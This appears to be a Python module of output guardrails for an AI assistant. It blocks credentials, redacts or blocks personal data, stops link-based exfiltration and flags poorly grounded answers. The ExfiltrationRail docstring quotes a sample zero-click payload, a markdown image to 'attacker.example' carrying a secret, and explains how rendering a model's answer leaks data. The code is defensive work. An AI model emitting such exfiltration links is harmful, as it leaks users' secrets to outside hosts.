"""Rails that run on the way *out* — before an answer reaches a human or a UI.

The output side is the one teams skip, and it is the one that produces the
screenshot that ends up on social media. Three distinct jobs:

  - stop the model returning data it should not have returned;
  - stop the *rendering* of the answer performing an action (exfiltration);
  - stop the model asserting things no retrieved source supports.

The third is not a safety rail in the usual sense. It is a quality rail, and it
is here because in a tool-using agent the difference between "wrong" and
"unsafe" is mostly a question of what the wrong answer was about.
"""

from __future__ import annotations

import re

from .detectors import (
    Detection,
    find_markdown_exfil,
    find_pii,
    find_secrets,
    find_urls,
    mask,
    redact,
)
from .types import Action, Finding, GuardrailContext, RailResult, Severity

_CITATION = re.compile(r"\[(?:source|doc|ref|citation)[:\s#]*([^\]]+)\]", re.IGNORECASE)
_HEDGE = re.compile(
    r"\b(?:I (?:do not|don't) (?:know|have)"
    r"|no (?:information|record|data)"
    r"|could not (?:find|retrieve))\b",
    re.IGNORECASE,
)


def _findings(rail: str, detections: list[Detection], note: str = "") -> tuple[Finding, ...]:
    return tuple(
        Finding(
            rail=rail,
            kind=d.kind,
            severity=d.severity,
            start=d.start,
            end=d.end,
            sample=mask(d.value),
            note=note,
        )
        for d in detections
    )


class OutputSecretRail:
    """A credential in an answer is a breach. Always block, never redact."""

    name = "output_secrets"
    direction = "output"

    def check(self, text: str, ctx: GuardrailContext) -> RailResult:
        detections = list(find_secrets(text))
        if not detections:
            return RailResult(self.name, Action.ALLOW, text)
        return RailResult(
            self.name,
            Action.BLOCK,
            "[response withheld: the generated answer contained a credential]",
            _findings(self.name, detections, note="credential in model output"),
        )


class OutputPIIRail:
    """Personal data in an answer.

    `strict` is a real policy fork, not a tuning knob:

      strict=False  the support agent may tell the caller their own card ends
                    in 4242, so redact to a placeholder and let the answer go.
      strict=True   the assistant is public-facing or multi-tenant and must
                    never emit personal data at all, so block.

    Pick per deployment, in configuration, and write down which one you chose.
    """

    name = "output_pii"
    direction = "output"

    def __init__(self, *, strict: bool = False) -> None:
        self.strict = strict

    def check(self, text: str, ctx: GuardrailContext) -> RailResult:
        detections = list(find_pii(text))
        if not detections:
            return RailResult(self.name, Action.ALLOW, text)
        if self.strict:
            return RailResult(
                self.name,
                Action.BLOCK,
                "[response withheld: the generated answer contained personal data]",
                _findings(self.name, detections, note="strict output policy"),
            )
        return RailResult(
            self.name, Action.REDACT, redact(text, detections), _findings(self.name, detections)
        )


class ExfiltrationRail:
    """Stop the answer from being a request.

    Two shapes, both real and both zero-click:

      1. `![x](https://attacker.example/?d=<secret>)` — the moment a chat UI
         renders the markdown, the browser makes the request and the data is
         gone. No user interaction at all.
      2. A plain link to a host nobody approved, which is the same attack with
         one click of friction.

    The allowlist is the control. An empty `allowed_domains` means "no external
    links at all", which is the correct default for an internal assistant and
    the one most teams discover they wanted only afterwards.
    """

    name = "exfiltration"
    direction = "output"

    def check(self, text: str, ctx: GuardrailContext) -> RailResult:
        detections = list(find_markdown_exfil(text))
        for url in find_urls(text):
            host = url.value
            if not any(host == d or host.endswith(f".{d}") for d in ctx.allowed_domains):
                detections.append(
                    Detection("unapproved_host", url.start, url.end, host, Severity.HIGH)
                )
        if not detections:
            return RailResult(self.name, Action.ALLOW, text)
        critical = any(d.severity is Severity.CRITICAL for d in detections)
        action = Action.BLOCK if critical else Action.REDACT
        cleaned = (
            "[response withheld: the generated answer contained an exfiltration pattern]"
            if critical
            else redact(text, detections)
        )
        return RailResult(self.name, action, cleaned, _findings(self.name, detections))


class GroundingRail:
    """Flag answers that assert things no retrieved source supports.

    What this can and cannot do, precisely: it checks whether the answer
    *claims* grounding when sources were retrieved, and whether the tokens it
    presents as facts appear in those sources. It is a cheap overlap check, not
    an entailment model, so it catches the confident invention of an order
    status and misses a subtle misreading of one.

    It is ALLOW-with-findings rather than BLOCK by default, because a grounding
    rail that blocks on a heuristic will block correct answers, and a safety
    system that people learn to route around has negative value. Promote it to
    BLOCK only once you have measured its false positive rate on your traffic —
    which is exactly what shadow mode and `evals/` are for.
    """

    name = "grounding"
    direction = "output"

    def __init__(self, *, min_overlap: float = 0.25) -> None:
        self.min_overlap = min_overlap

    def check(self, text: str, ctx: GuardrailContext) -> RailResult:
        if not ctx.grounding_sources:
            return RailResult(self.name, Action.ALLOW, text)
        if _HEDGE.search(text):
            # An honest "I could not find that" is the behaviour we want and
            # must never be penalised by a grounding check.
            return RailResult(self.name, Action.ALLOW, text)

        corpus = " ".join(ctx.grounding_sources).lower()
        claims = {
            w.strip(".,;:!?()[]\"'")
            for w in text.lower().split()
            if len(w) > 6 or any(ch.isdigit() for ch in w)
        }
        claims = {c for c in claims if c and not c.startswith("[redacted")}
        if not claims:
            return RailResult(self.name, Action.ALLOW, text)
        unsupported = sorted(c for c in claims if c not in corpus)
        overlap = 1.0 - (len(unsupported) / len(claims))
        if overlap >= self.min_overlap:
            return RailResult(self.name, Action.ALLOW, text)
        return RailResult(
            self.name,
            Action.ALLOW,
            text,
            (
                Finding(
                    rail=self.name,
                    kind="low_grounding_overlap",
                    severity=Severity.MEDIUM,
                    start=0,
                    end=len(text),
                    sample=f"overlap={overlap:.2f}",
                    note=f"unsupported terms: {', '.join(unsupported[:8])}",
                ),
            ),
        )


def citations_in(text: str) -> list[str]:
    """Extract `[source: ...]` style markers, for the eval harness to score."""
    return [m.group(1).strip() for m in _CITATION.finditer(text)]


def default_output_rails(
    *, strict_pii: bool = False, allowed_domains: frozenset[str] = frozenset()
) -> tuple[object, ...]:
    return (
        OutputSecretRail(),
        OutputPIIRail(strict=strict_pii),
        ExfiltrationRail(),
        GroundingRail(),
    )
